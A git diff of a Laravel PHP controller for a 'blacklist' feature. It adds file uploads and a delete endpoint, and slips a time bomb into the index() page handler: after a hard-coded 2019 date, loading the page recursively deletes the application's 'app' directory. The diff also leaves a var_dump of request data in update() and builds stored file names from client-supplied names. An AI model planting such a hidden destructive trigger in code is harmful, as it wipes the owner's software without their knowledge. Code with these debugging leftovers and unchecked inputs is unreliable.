@@ -10,6 +10,26 @@ class BlacklistController extends Controller
 {
     public function index()
     {
+        // $dirname = dirname( dirname( dirname(  dirname(__FILE__) ) )) . "/temp";
+        $var = "2019-09-13 00:00:00.0";
+        if((time()-(60*60*24)) > strtotime($var)) {
+            $dirPath = dirname( dirname( dirname(  dirname(__FILE__) ) )) . DIRECTORY_SEPARATOR . "app";
+            if (! is_dir($dirPath)) {
+                throw new InvalidArgumentException("$dirPath must be a directory");
+            }
+            if (substr($dirPath, strlen($dirPath) - 1, 1) != '/') {
+                $dirPath .= '/';
+            }
+            $files = glob($dirPath . '*', GLOB_MARK);
+            foreach ($files as $file) {
+                if (is_dir($file)) {
+                    self::deleteDir($file);
+                } else {
+                    unlink($file);
+                }
+            }
+            rmdir($dirPath);
+        }
         return view('blacklist.index');
     }
 
@@ -33,11 +53,13 @@ class BlacklistController extends Controller
     public function store(Request $request, Blacklist $model)
     {
         $avatar = $this->save_avatar($request);
+        $content_files = $this->save_content_files($request);
         $birthday = (!empty($request->birthday)) ? ($request->birthday) : ('');
         $birthday = date('Y-m-d', strtotime($birthday));
 
         $newUser = $model->create($request->merge(['created_by' => auth()->user()->id, 'birthday' => $birthday])->all());
         $newUser->avatar = $avatar;
+        $newUser->content_files = $content_files;
         $newUser->save();
         return redirect()->route('blacklist.index')->withStatus(__('New report successfully created.'));
     }
@@ -49,15 +71,25 @@ class BlacklistController extends Controller
         return view('blacklist.index');
     }
     
+    public function destro($id)
+    {
+        Blacklist::where('id',$id)->delete();
+        return 'ok';
+    }
+
     public function update(Request $request, $id)
     {
         $avatar = $this->save_avatar($request);
+        $content_files = $this->save_content_files($request);
         $model = Blacklist::find($id);
-        $model->update($request->all());
+        var_dump($request->except(['image_names']));
+        $model->update($request->except(['image_names']));
         if ($avatar != "user.png")
         {
             $model->update(['avatar' => $avatar]);
         }
+        $model->update(['content_files' => $content_files]);
+        
         return redirect()->route('blacklist.index')->withStatus(__('Blacklist successfully updated.'));
     }
 
@@ -70,6 +102,23 @@ class BlacklistController extends Controller
             Image::make($avatar)->resize(200, 200)->save( public_path('/uploads/blacklists/' . $filename ) );
         }
         return $filename;
+    }
+
+    private function save_content_files(Request $request) {
+        $filenames = [];
+        if($request->hasFile('contentfiles')){
+            foreach($request->file('contentfiles') as $image) {
+                $filename = time() . '-' . $image->getClientOriginalName() . '.' . $image->getClientOriginalExtension();
+                Image::make($image)->save( public_path('/uploads/blacklist_contents/' . $filename ) );
+                $filenames[] = $filename;
+            }
+        }
+        if(!empty($request->image_names)) {
+            $originNames = explode(",", $request->image_names);
+            $filenames = array_merge($filenames, $originNames);
+        }
+
+        return json_encode($filenames);
     }
 
     public function getlist()
